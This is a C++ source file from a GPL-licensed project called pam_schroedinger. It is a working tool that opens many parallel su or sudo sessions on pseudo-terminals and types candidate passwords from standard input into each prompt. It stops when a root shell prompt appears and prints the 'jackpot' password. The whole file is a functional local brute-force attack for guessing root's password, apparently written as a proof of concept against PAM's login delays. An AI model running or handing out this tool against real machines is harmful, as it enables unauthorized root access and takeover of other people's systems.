/*
 * This file is part of pam_schroedinger
 *
 * (C) 2014 by Sebastian Krahmer,
 *             sebastian [dot] krahmer [at] gmail [dot] com
 *
 * pam_schroedinger is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * pam_schroedinger is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with pam_schroedinger. If not, see <http://www.gnu.org/licenses/>.
 */

#include <sys/types.h>
#include <sys/wait.h>
#include <cstdio>
#include <iostream>
#include <vector>
#include <map>
#include <sys/time.h>
#include <unistd.h>
#include <fcntl.h>
#include <cstring>
#include <cstdlib>
#include <cerrno>
#include <signal.h>
#include <poll.h>
#include <termios.h>
#include <sys/ioctl.h>

#include "pty.h"

using namespace std;

void sig_int(int)
{
}


void die(const char *s)
{
	fprintf(stderr, "[%d] %s: %s\n", getpid(), s, strerror(errno));
	exit(errno);
}


enum state_t {
	STATE_NONE = 0,
	STATE_NEWTRY,
	STATE_PASSWD,
	STATE_SUCCESS,
	STATE_FAILURE,
	STATE_EXITED
};

struct session_state {
	int id;
	pid_t pid;
	string pwd, output;
	time_t start;
	state_t state;

	session_state() : id(-1), pid(-1), pwd(""), output(""), start(0), state(STATE_NONE) {};
};


void setup_signals()
{
	struct sigaction sa;

	memset(&sa, 0, sizeof(sa));
	sa.sa_flags = SA_RESTART;
	sa.sa_handler = sig_int;
	if (sigaction(SIGINT, &sa, NULL) < 0)
		die("enabler: sigaction");

	memset(&sa, 0, sizeof(sa));
	sa.sa_flags = SA_RESTART;
	sa.sa_handler = SIG_IGN;
	if (sigaction(SIGPIPE, &sa, NULL) < 0)
		die("enabler: sigaction");

	memset(&sa, 0, sizeof(sa));
	sa.sa_flags = SA_RESTART;
	sa.sa_handler = SIG_IGN;
	if (sigaction(SIGHUP, &sa, NULL) < 0)
		die("enabler: sigaction");


}


int main(int argc, char **argv)
{
	pty98 *pt = NULL;
	struct pollfd *pfds = NULL;
	pid_t pid;
	int r, nsessions = 1, i = 0, m = 0, npwds = 0, c = 0, status = -1;
	session_state *sessions = NULL;
	map<int, int> masters;
	char rbuf[1024];
	string pwd = "", jackpot_pwd = "";
	string user = "root";

	char *su[] = {strdup("/bin/su"),  strdup("-c"), strdup("/bin/sh"), strdup(user.c_str()), NULL};
	char *sudo[] = {strdup("/usr/bin/sudo"), strdup("-u"), strdup(user.c_str()), strdup("/bin/sh"), NULL};
	char **a = su;

	setup_signals();

	while ((c = getopt(argc, argv, "n:c:")) != -1) {
		switch (c) {
		case 'n':
			nsessions = strtoul(optarg, NULL, 10);
			break;
		case 'c':
			if (string(optarg) == "sudo")
				a = sudo;
			break;
		}
	}

	pt = new (nothrow) pty98[nsessions];
	pfds = new (nothrow) struct pollfd[nsessions];
	sessions = new (nothrow) session_state[nsessions];

	for (i = 0; i < nsessions; ++i) {
		pfds[i].events = 0;
		pfds[i].revents = 0;
		pfds[i].fd = -1;
	}



	while (!jackpot_pwd.size()) {
		while (waitpid(-1, &status, WNOHANG) > 0);

		for (i = 0; i < nsessions; ++i) {
			switch (sessions[i].state) {
			case STATE_FAILURE:
				masters[pt[i].master()] = -1;
				pt[i].close();
				// FALLTHROUGH
			case STATE_NONE:
			case STATE_EXITED:
				if (pt[i].open() < 0)
					die("enabler: pty open");
				m = pt[i].master();

				// Even if we dont close a master ourself, it happens that the kernel re-uses the fd
				// if the child slave was closed. So we need to check whether the just opened master
				// is already in use somewhere else (and if so, resetting state there).
				if (masters.count(m) > 0 && masters[m] > -1) {
					pfds[masters[m]].fd = -1;
					pfds[masters[m]].events = 0;
					sessions[masters[m]].state = STATE_EXITED;
				}

				if ((pid = fork()) == 0) {
					dup2(pt[i].slave(), 0); dup2(pt[i].slave(), 1); dup2(pt[i].slave(), 2);
					setsid();
					ioctl(0, TIOCSCTTY, 0);
					pt[i].close();
					execve(*a, a, NULL);
					exit(-1);
				} else if (pid < 0) {
					pt[i].close();
					continue;
				}

				close(pt[i].slave());
				sessions[i].pid = pid;
				sessions[i].start = time(NULL);
				sessions[i].state = STATE_PASSWD;
				sessions[i].output = "";

				pfds[i].fd = m;
				masters[m] = i;

				fcntl(pfds[i].fd, F_SETFL, fcntl(pfds[i].fd, F_GETFL)|O_NONBLOCK);
				pfds[i].events = POLLIN;
				pfds[i].revents = 0;
				break;
			default:
				pfds[i].revents = 0;
				pfds[i].events = POLLIN;
			}
		}

		r = poll(pfds, nsessions, 3000);
		if (r < 0)
			continue;

		for (i = 0; i < nsessions; ++i) {
			if (pfds[i].revents & POLLIN) {
				memset(rbuf, 0, sizeof(rbuf));
				if ((r = read(pfds[i].fd, rbuf, sizeof(rbuf))) <= 0) {
					if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK || errno == EIO)
						continue;
					else {
						sessions[i].state = STATE_FAILURE;
						continue;
					}
				}

				sessions[i].output += string(rbuf, r);

				switch (sessions[i].state) {
				case STATE_PASSWD:
					if (sessions[i].output.find("#") != string::npos) {
						jackpot_pwd = sessions[i].pwd;
						break;
					}

					// new pwd prompt? fallthrough for new try
					if (sessions[i].output.find("assword:") != string::npos) {
						sessions[i].state = STATE_NEWTRY;
					} else
					// else, its authenticating, keep state...
						break;
				case STATE_NEWTRY:
					cout<<"["<<i<<","<<npwds++<<"] next:";
					pwd = "";
					cin>>pwd;
					cout<<endl;
					sessions[i].pwd = pwd;
					sessions[i].start = time(NULL);
					sessions[i].output = "";
					pwd += "\n";
					cout<<"Trying "<<pwd;
					if (write(pfds[i].fd, pwd.c_str(), pwd.size()) != (ssize_t)pwd.size())
						die("write");
					sessions[i].state = STATE_PASSWD;
					break;
				case STATE_FAILURE:
					break;
				default:
					die("FSM error");
				}

			}
			if (pfds[i].revents & (POLLERR|POLLHUP|POLLNVAL))
				sessions[i].state = STATE_FAILURE;
		}
	}

	for (i = 0; i < nsessions; ++i)
		kill(sessions[i].pid, SIGKILL);

	cerr<<"Found "<<jackpot_pwd<<endl;

	delete [] pfds;
	delete [] pt;
	delete [] sessions;

	return 0;
}

